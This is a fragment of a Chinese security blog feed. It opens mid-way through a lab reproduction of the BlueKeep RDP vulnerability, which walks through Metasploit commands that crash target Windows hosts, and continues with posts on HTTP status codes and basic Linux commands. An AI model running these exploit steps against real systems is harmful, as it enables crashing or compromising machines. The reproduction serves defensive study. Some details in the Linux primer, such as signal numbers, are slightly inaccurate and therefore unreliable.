class="line"></span><br><span class="line">Payload information:</span><br><span class="line">  Space: 952</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  The RDP termdd.sys driver improperly handles binds to internal-only </span><br><span class="line">  channel MS_T120, allowing a malformed Disconnect Provider Indication </span><br><span class="line">  message to cause use-after-free. With a controllable data/size </span><br><span class="line">  remote nonpaged pool spray, an indirect call gadget of the freed </span><br><span class="line">  channel is used to achieve arbitrary code execution.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://cvedetails.com/cve/CVE-2019-0708/</span><br><span class="line">  https://github.com/zerosum0x0/CVE-2019-0708</span><br><span class="line"></span><br><span class="line">Also known as:</span><br><span class="line">  Bluekeep</span><br></pre></td></tr></table></figure><blockquote><p>show options</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911180651.png" class="lozad"></p><blockquote><p>set rhosts 靶机IP地址</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911180915.png" class="lozad"></p><blockquote><p>show targets</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911180936.png" class="lozad"></p><blockquote><p>set target 3</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911181004.png" class="lozad"></p><blockquote><p>exploit</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911181144.png" class="lozad"></p><p>ps: run和exploit都行</p><h1 id="0x04-复现结果"><a href="#0x04-复现结果" class="headerlink" title="0x04 复现结果"></a>0x04 复现结果</h1><p>Windows server 2008 R2标准版出现蓝屏</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175744.png" class="lozad"></p><p>Windows 7 ultimate sp1复现结果</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175754.png" class="lozad"></p><h1 id="0X05-漏洞检测修复工具-amp-批量快速扫描检测工具-amp-热补丁工具"><a href="#0X05-漏洞检测修复工具-amp-批量快速扫描检测工具-amp-热补丁工具" class="headerlink" title="0X05 漏洞检测修复工具&amp;批量快速扫描检测工具&amp;热补丁工具"></a>0X05 漏洞检测修复工具&amp;批量快速扫描检测工具&amp;热补丁工具</h1><blockquote><p>（来源奇安信公众号）</p></blockquote><p>【下载页面】<br><a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank" rel="noopener">https://www.qianxin.com/other/CVE-2019-0708</a><br>【使用说明】</p><p>1、 下载文件进行解压。<br>2、 使用win+R快捷键或开始菜单选择“运行”，输入cmd。调起命令行工具。<br>3、 在命令行工具，执行命令到工具所在文件夹<br>4、 输入命令对应功能，启用热补丁命令：QKShield.exe /enable ；禁用热补丁命令：QKShield.exe/disable 。<br>5、 重启系统后，需要重新运行命令行来启用热补丁</p><p>【实现效果】<br>在工具支持的系统中启用热补丁后，用漏洞扫描工具扫描结果为没有漏洞。漏洞扫描工具下载地址：<a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank" rel="noopener">传送门</a><br>支持系统：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Windows XP <span class="keyword">for</span> 32-bit Systems Service Pack 3</span><br><span class="line">Windows 7 <span class="keyword">for</span> 32-bit Systems</span><br><span class="line">Windows 7 <span class="keyword">for</span> x64-based Systems</span><br><span class="line">Windows 7 <span class="keyword">for</span> 32-bit Systems Service Pack 1</span><br><span class="line">Windows 7 <span class="keyword">for</span> x64-based Systems Service Pack 1</span><br><span class="line">Windows Server 2003 <span class="keyword">for</span> 32-bit Systems Service Pack 2</span><br><span class="line">Windows Server 2003 R2 <span class="keyword">for</span> 32-bit Systems Service Pack2</span><br><span class="line">Windows Server 2008 <span class="keyword">for</span> 32-bit Systems Service Pack 2</span><br><span class="line">Windows Server 2008 <span class="keyword">for</span> 32-bit Systems Service Pack 2(Server Core installation)</span><br><span class="line">Windows Server 2008 <span class="keyword">for</span> x64-based Systems Service Pack2</span><br><span class="line">Windows Server 2008 <span class="keyword">for</span> x64-based Systems Service Pack2 (Server Core installation)</span><br><span class="line">Windows Server 2008 R2 <span class="keyword">for</span> x64-based Systems ServicePack 1</span><br><span class="line">Windows Server 2008 R2 <span class="keyword">for</span> x64-based Systems ServicePack 1 (Server Core installation)</span><br><span class="line">暂不支持的系统：</span><br><span class="line">Windows Server 2003 <span class="keyword">for</span> x64-based Systems Service Pack2</span><br><span class="line">Windows Server 2008 <span class="keyword">for</span> Itanium-Based Systems ServicePack 2</span><br><span class="line">Windows Server 2008 R2 <span class="keyword">for</span> Itanium-Based SystemsService Pack 1</span><br></pre></td></tr></table></figure><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>从漏洞刚出来开始，我就开始复现，然后各种安装环境，操作系统，但是都没有复现成功，然后看各种文章，感觉都是那些基本操作，么有什么其他地方，然后我使用Windows 7 X64 ultimate sp1 和Windows server 2008 R2都没有复现成功，弄了两天我放弃了，今天我的一天同事也复现这个漏洞，点出了我的错误所在，原来，我讲set target 3 写成了set targets 3 ，我真是太粗心了，没有注意细节，以为show targets命令是列出可攻击的目标列表，就像当然的认为设置目标是set targets了。。。,然后一直复现不成功</p><p><img alt="img" data-src="https://i02piccdn.sogoucdn.com/d535d591ed8c8755" class="lozad"></p><p>最后，自己要记住这个教训，细节注定成败，而我这次败在了细节上，希望自己以后不会忽略这些小细节。共勉 :D</p><h1 id="0x06-参考文档"><a href="#0x06-参考文档" class="headerlink" title="0x06 参考文档"></a>0x06 参考文档</h1><ol><li><a href="https://blog.csdn.net/weixin_44114370/article/details/89440153" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44114370/article/details/89440153</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzAxNjQ1NDQ0Mw==&amp;mid=2247483662&amp;idx=1&amp;sn=9927dd8b4df7e710ddc4d8b02f922d8d&amp;chksm=9bf5c74aac824e5cfbde1c6587b6fdb149d464bc822a5b764f25538183e6e64934d549461d5d&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1567824187733&amp;sharer_shareid=6236dccf93a9257bd8ba451703af334b&amp;key=ee95eb58550bee7fb822e11f9b1822af1833bae210322a6de084b4219a556826d764fbbf32aa5607dc4acf61a722ef8421901382f992c938d121d6226db2bc2b35a9d19b0eec3693f4a44e6b5d0298de&amp;ascene=1&amp;uin=NjA3MTQ5MDY2&amp;devicetype=Windows+10&amp;version=62060841&amp;lang=zh_CN&amp;pass_ticket=5vOsZrZPCHS2PeMt2y%2FquS927zFQZnSX%2FB%2FcGniqOlND7FA0KtfW5jlUG4BlXuNP" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzAxNjQ1NDQ0Mw==&amp;mid=2247483662&amp;idx=1&amp;sn=9927dd8b4df7e710ddc4d8b02f922d8d&amp;chksm=9bf5c74aac824e5cfbde1c6587b6fdb149d464bc822a5b764f25538183e6e64934d549461d5d&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1567824187733&amp;sharer_shareid=6236dccf93a9257bd8ba451703af334b&amp;key=ee95eb58550bee7fb822e11f9b1822af1833bae210322a6de084b4219a556826d764fbbf32aa5607dc4acf61a722ef8421901382f992c938d121d6226db2bc2b35a9d19b0eec3693f4a44e6b5d0298de&amp;ascene=1&amp;uin=NjA3MTQ5MDY2&amp;devicetype=Windows+10&amp;version=62060841&amp;lang=zh_CN&amp;pass_ticket=5vOsZrZPCHS2PeMt2y%2FquS927zFQZnSX%2FB%2FcGniqOlND7FA0KtfW5jlUG4BlXuNP</a></li><li><a href="https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961" target="_blank" rel="noopener">https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961</a> </li><li><a href="https://github.com/mai-lang-chai/CVE-2019-0708-RCE" target="_blank" rel="noopener">https://github.com/mai-lang-chai/CVE-2019-0708-RCE</a></li><li><a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank" rel="noopener">https://www.qianxin.com/other/CVE-2019-0708</a></li></ol><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;前几天，随着CVE-2019-0708漏洞EXP的现世，顿时让安全圈躁动起来，大家都通过官网的一些文档教程来自己搭建环境复现漏洞，而菜鸡的我，复现了好久，却久久不能复现成功，今天再次复现，发现了问题的所在，再次献上自己的复现教程，虽然网上教程已经泛滥。&lt;/p&gt;
&lt;p&gt;&lt;img alt data-src=&quot;https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911173741.png&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞复现" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CVE" scheme="https://www.mad-coding.cn/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>常见的HTTP响应状态码</title>
    <link href="https://www.mad-coding.cn/2019/09/10/%E5%B8%B8%E8%A7%81%E7%9A%84HTTP%E5%93%8D%E5%BA%94%E7%8A%B6%E6%80%81%E7%A0%81/"/>
    <id>https://www.mad-coding.cn/2019/09/10/常见的HTTP响应状态码/</id>
    <published>2019-09-10T08:13:54.000Z</published>
    <updated>2019-09-10T08:30:40.111Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><a id="more"></a><h1 id="0x01-正文"><a href="#0x01-正文" class="headerlink" title="0x01 正文"></a>0x01 正文</h1><p>100 –继续–请求者应当继续提出请求。服务器已收到请求的一部分，正在等待其余部分</p><p>101 –切换协议–请求者已要求服务器切换协议，服务器已确认并准备切换</p><p>200 –成功–服务器已成功处理了请求</p><p>201 –已创建–请求成功并且服务器创建了新的资源</p><p>202 –已接受–服务器已接受请求，但尚未处理</p><p>203 –非授权信息–服务器已成功处理了请求，但返回的想你想可能来自另一个源</p><p>204  –无内容–服务器成功处理了请求，但没有返回任何内容</p><p>205 –重置内容–服务器成功处理了请求，内容被重置</p><p>206 –部分内容–服务器成功处理部分请求</p><p>300 –多种选择–针对请求，服务器可执行多种操作</p><p>301 –永久移动 –请求的网页已永久移动到新的位置，即永久重定向</p><p>302 –临时移动–请求的网页暂时跳转到其他按页面，即暂时重定向</p><p>303 –查看其他位置–如果原来的请求是POST，重定向目标文档应该通过GET提取</p><p>304 –未修改–此次请求返回的网页未修改，继续使用上次的资源</p><p>305 –使用代理–请求者应该使用代理访问该网页</p><p>307 –临时重定向–请求的资源临时从其他位置响应</p><p>400 –错误请求–服务器无法解析该请求</p><p>401 –未授权–请求没有进行身份验证或者验证未通过</p><p>403 –禁止访问–服务器拒绝此请求</p><p>404 –未找到–服务器找不到请求的网页</p><p>405 –方法禁用–服务器禁用了请求中指定的方法</p><p>406 –不接受 –无法使用请求的内容响应请求的网页。</p><p>407 –需要代理授权–请求者需要使用代理授权</p><p>408 –请求超时–服务器请求超时</p><p>409 –冲突–服务器在完成请求时发生冲突</p><p>410 –已删除–请求的资源已永久删除</p><p>411 –需要有效长度–服务器不接受不含有有效内容长度表头字段的请求。</p><p>501 –未实现–服务器不具备完成请求的功能<br>502 –错误网关–服务器作为网关或者代理，从上游服务器收到无效响应<br>503 –服务不可用–服务器目前无法使用<br>504 –网关超时–服务器作为网关或者代理，但是没有及时从上游服务器收到请求<br>505 –HTTP版本不支持–服务器不支持请求中所用的HTTP协议版本</p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基础Vim命令</title>
    <link href="https://www.mad-coding.cn/2019/09/05/%E5%9F%BA%E7%A1%80Vim%E5%91%BD%E4%BB%A4/"/>
    <id>https://www.mad-coding.cn/2019/09/05/基础Vim命令/</id>
    <published>2019-09-05T03:16:16.000Z</published>
    <updated>2019-09-05T03:16:16.552Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><a id="more"></a><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基础SQL语句</title>
    <link href="https://www.mad-coding.cn/2019/09/05/%E5%9F%BA%E7%A1%80SQL%E8%AF%AD%E5%8F%A5/"/>
    <id>https://www.mad-coding.cn/2019/09/05/基础SQL语句/</id>
    <published>2019-09-05T03:15:52.000Z</published>
    <updated>2019-09-05T03:15:52.972Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><a id="more"></a><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基础Linux命令</title>
    <link href="https://www.mad-coding.cn/2019/09/05/%E5%9F%BA%E7%A1%80Linux%E5%91%BD%E4%BB%A4/"/>
    <id>https://www.mad-coding.cn/2019/09/05/基础Linux命令/</id>
    <published>2019-09-05T03:15:40.000Z</published>
    <updated>2019-09-18T01:32:08.223Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Linux在渗透测试和安全运维的工作中都会经常使用，但是命令太多，作为一个普通的人类是不可能全部都记住的。所以在这里整理一个Linux命令的文档来方便自己日后查看。</p><a id="more"></a><h1 id="0x01-基础命令"><a href="#0x01-基础命令" class="headerlink" title="0x01 基础命令"></a>0x01 基础命令</h1><h2 id="1-1-cd命令"><a href="#1-1-cd命令" class="headerlink" title="1.1 cd命令"></a>1.1 cd命令</h2><p>这是一个非常基本，也是大家经常需要使用的命令，它用于切换当前目录，它的参数是要切换到的目录的路径，可以是绝对路径，也可以是相对路径。如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/Docements <span class="comment"># 切换到目录/root/Docements  </span></span><br><span class="line"><span class="built_in">cd</span> ./path          <span class="comment"># 切换到当前目录下的path目录中，“.”表示当前目录   </span></span><br><span class="line"><span class="built_in">cd</span> ../path         <span class="comment"># 切换到上层目录中的path目录中，“..”表示上一层目录</span></span><br></pre></td></tr></table></figure><h2 id="1-2-ls命令"><a href="#1-2-ls命令" class="headerlink" title="1.2 ls命令"></a>1.2 ls命令</h2><p>这是一个非常有用的查看文件与目录的命令，list之意，它的参数非常多，下面就列出一些我常用的参数吧，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-l ：列出长数据串，包含文件的属性与权限数据等  </span><br><span class="line">-a ：列出全部的文件，连同隐藏文件（开头为.的文件）一起列出来（常用） </span><br><span class="line">-d ：仅列出目录本身，而不是列出目录的文件数据  </span><br><span class="line">-h ：将文件容量以较易读的方式（GB，kB等）列出来  </span><br><span class="line">-R ：连同子目录的内容一起列出（递归列出），等于该目录下的所有文件都会显示出来</span><br></pre></td></tr></table></figure><p>注：这些参数也可以组合使用，下面举两个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l  #以长数据串的形式列出当前目录下的数据文件和目录  </span><br><span class="line">ls -lR #以长数据串的形式列出当前目录下的所有文件</span><br></pre></td></tr></table></figure><h2 id="1-3-grep命令"><a href="#1-3-grep命令" class="headerlink" title="1.3 grep命令"></a>1.3 grep命令</h2><p>该命令常用于分析一行的信息，若当中有我们所需要的信息，就将该行显示出来，该命令通常与管道命令一起使用，用于对一些命令的输出进行筛选加工等等.</p><p>简单语法:</p><blockquote><p>grep [-acinv] [–color=auto] ‘查找字符串’ filename</p></blockquote><p>它的常用参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-a ：将binary文件以text文件的方式查找数据</span><br><span class="line">-c ：计算找到‘查找字符串’的次数</span><br><span class="line">-i ：忽略大小写的区别，即把大小写视为相同</span><br><span class="line">-v ：反向选择，即显示出没有‘查找字符串’内容的那一行</span><br><span class="line"># 例如：</span><br><span class="line"># 取出文件/etc/man.config中包含MANPATH的行，并把找到的关键字加上颜色</span><br><span class="line">grep --color=auto &apos;MANPATH&apos; /etc/man.config</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 把ls -l的输出中包含字母file（不区分大小写）的内容输出</span><br><span class="line">ls -l | grep -i file</span><br></pre></td></tr></table></figure><h2 id="1-4-find命令"><a href="#1-4-find命令" class="headerlink" title="1.4 find命令"></a>1.4 find命令</h2><p>find是一个基于查找的功能非常强大的命令，相对而言，它的使用也相对较为复杂，参数也比较多，所以在这里将给把它们分类列出，它的基本语法如下：</p><blockquote><p>语法：find [PATH] [option] [action]  </p></blockquote><ol><li>与时间有关的参数：  </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-mtime n : n为数字，意思为在n天之前的“一天内”被更改过的文件；  </span><br><span class="line">-mtime +n : 列出在n天之前（不含n天本身）被更改过的文件名；  </span><br><span class="line">-mtime -n : 列出在n天之内（含n天本身）被更改过的文件名；  </span><br><span class="line">-newer file : 列出比file还要新的文件名</span><br></pre></td></tr></table></figure><p>​        例如：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /root -mtime 0 # 在当前目录下查找今天之内有改动的文件</span><br></pre></td></tr></table></figure><ol start="2"><li>与用户或用户组名有关的参数：  </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-user name : 列出文件所有者为name的文件  </span><br><span class="line">-group name : 列出文件所属用户组为name的文件  </span><br><span class="line">-uid n : 列出文件所有者为用户ID为n的文件  </span><br><span class="line">-gid n : 列出文件所属用户组为用户组ID为n的文件</span><br></pre></td></tr></table></figure><p>​        例如：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /home/ljianhui -user ljianhui # 在目录/home/ljianhui中找出所有者为ljianhui的文件</span><br></pre></td></tr></table></figure><ol start="3"><li>与文件权限及名称有关的参数：   </li></ol><p>​        例如：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -name passwd # 查找文件名为passwd的文件  </span><br><span class="line"></span><br><span class="line">find . -perm 0755 # 查找当前目录中文件权限的0755的文件  </span><br><span class="line"></span><br><span class="line">find . -size +12k # 查找当前目录中大于12KB的文件，注意c表示byte</span><br></pre></td></tr></table></figure><blockquote><p>语法：find [PATH] [option] [action]</p></blockquote><h2 id="1-5-cp命令"><a href="#1-5-cp命令" class="headerlink" title="1.5 cp命令"></a>1.5 cp命令</h2><p>该命令用于复制文件，copy之意，它还可以把多个文件一次性地复制到一个目录下，它的常用参数如下：</p><blockquote><p>语法：[plain] <a href="http://blog.csdn.net/ljianhui/article/details/11100625/" target="_blank" rel="noopener">view plain</a> <a href="http://blog.csdn.net/ljianhui/article/details/11100625/" target="_blank" rel="noopener">copy</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-a ：将文件的特性一起复制  </span><br><span class="line"></span><br><span class="line">-p ：连同文件的属性一起复制，而非使用默认方式，与-a相似，常用于备份 </span><br><span class="line"></span><br><span class="line">-i ：若目标文件已经存在时，在覆盖时会先询问操作的进行  </span><br><span class="line"></span><br><span class="line">-r ：递归持续复制，用于目录的复制行为  </span><br><span class="line"></span><br><span class="line">-u ：目标文件与源文件有差异时才会复制</span><br></pre></td></tr></table></figure><p>​      例如 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cp -a file1 file2 #连同文件的所有特性把文件file1复制成文件file2  </span><br><span class="line">cp file1 file2 file3 dir #把文件file1、file2、file3复制到目录dir中  </span><br><span class="line"></span><br><span class="line">cp -a file1 file2 #连同文件的所有特性把文件file1复制成文件file2</span><br><span class="line"></span><br><span class="line">cp file1 file2 file3 dir #把文件file1、file2、file3复制到目录dir中</span><br></pre></td></tr></table></figure><h2 id="1-6-mv命令"><a href="#1-6-mv命令" class="headerlink" title="1.6 mv命令"></a>1.6 mv命令</h2><p>该命令用于移动文件、目录或更名，move之意，它的常用参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-f ：force强制的意思，如果目标文件已经存在，不会询问而直接覆盖  </span><br><span class="line"></span><br><span class="line">-i ：若目标文件已经存在，就会询问是否覆盖  </span><br><span class="line"></span><br><span class="line">-u ：若目标文件已经存在，且比目标文件新，才会更新</span><br></pre></td></tr></table></figure><blockquote><p>PS：该命令可以把一个文件或多个文件一次移动一个文件夹中，但是最后一个目标文件一定要是“目录”。</p></blockquote><h2 id="1-7-rm命令"><a href="#1-7-rm命令" class="headerlink" title="1.7 rm命令"></a>1.7 rm命令</h2><p>该命令用于删除文件或目录，remove之间，它的常用参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-f ：就是force的意思，忽略不存在的文件，不会出现警告消息  </span><br><span class="line"></span><br><span class="line">-i ：互动模式，在删除前会询问用户是否操作  </span><br><span class="line"></span><br><span class="line">-r ：递归删除，最常用于目录删除，它是一个非常危险的参数</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm -i file # 删除文件file，在删除之前会询问是否进行该操作  </span><br><span class="line"></span><br><span class="line">rm -fr dir # 强制删除目录dir中的所有文件</span><br></pre></td></tr></table></figure><h2 id="1-8-ps命令"><a href="#1-8-ps命令" class="headerlink" title="1.8 ps命令"></a>1.8 ps命令</h2><p>该命令用于将某个时间点的进程运行情况选取下来并输出，process之意，它的常用参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-A ：所有的进程均显示出来  </span><br><span class="line"></span><br><span class="line">-a ：不与terminal有关的所有进程  </span><br><span class="line"></span><br><span class="line">-u ：有效用户的相关进程  </span><br><span class="line"></span><br><span class="line">-x ：一般与a参数一起使用，可列出较完整的信息  </span><br><span class="line"></span><br><span class="line">-l ：较长，较详细地将PID的信息列出</span><br></pre></td></tr></table></figure><p>其实我们只要记住ps一般使用的命令参数搭配即可，它们并不多，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ps aux # 查看系统所有的进程数据  </span><br><span class="line"></span><br><span class="line">ps ax # 查看不与terminal有关的所有进程  </span><br><span class="line"></span><br><span class="line">ps -lA # 查看系统所有的进程数据  </span><br><span class="line"></span><br><span class="line">ps axjf # 查看连同一部分进程树状态</span><br></pre></td></tr></table></figure><h2 id="1-9-kill命令"><a href="#1-9-kill命令" class="headerlink" title="1.9 kill命令"></a>1.9 kill命令</h2><p>该命令用于向某个工作（%jobnumber）或者是某个PID（数字）传送一个信号，它通常与ps和jobs命令一起使用，它的基本语法如下：</p><blockquote><p>语法：kill -signal PID</p></blockquote><p>signal的常用参数如下：</p><p>注：最前面的数字为信号的代号，使用时可以用代号代替相应的信号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1：SIGHUP，启动被终止的进程  </span><br><span class="line"></span><br><span class="line">2：SIGINT，相当于输入ctrl+c，中断一个程序的进行  </span><br><span class="line"></span><br><span class="line">9：SIGKILL，强制中断一个进程的进行  </span><br><span class="line"></span><br><span class="line">15：SIGTERM，以正常的结束进程方式来终止进程  </span><br><span class="line"></span><br><span class="line">17：SIGSTOP，相当于输入ctrl+z，暂停一个进程的进行</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 以正常的结束进程方式来结束第一个后台工作，可用jobs命令查看后台中的第一个工作进程  </span><br><span class="line"></span><br><span class="line">kill -SIGTERM %1   </span><br><span class="line"></span><br><span class="line"># 重新改动进程ID为PID的进程，PID可用ps命令通过管道命令加上grep命令进筛选获得  </span><br><span class="line"></span><br><span class="line">kill -SIGHUP PID</span><br></pre></td></tr></table></figure><h2 id="1-10-killall命令"><a href="#1-10-killall命令" class="headerlink" title="1.10 killall命令"></a>1.10 killall命令</h2><p>该命令用于向一个命令启动的进程发送一个信号</p><blockquote><p>语法：killall [-iIe] [command name]</p></blockquote><p>参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-i ：交互式的意思，若需要删除时，会询问用户</span><br><span class="line">-e ：表示后面接的command name要一致，但command name不能超过15个字符</span><br><span class="line">-I ：命令名称忽略大小写</span><br><span class="line"># 例如：</span><br><span class="line">killall -SIGHUP syslogd # 重新启动syslogd</span><br></pre></td></tr></table></figure><h2 id="1-11-file命令"><a href="#1-11-file命令" class="headerlink" title="1.11 file命令"></a>1.11 file命令</h2><p>该命令用于判断接在file命令后的文件的基本数据，因为在Linux下文件的类型并不是以后缀为分的，所以这个命令对我们来说就很有用了，它的用法非常简单，基本语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file 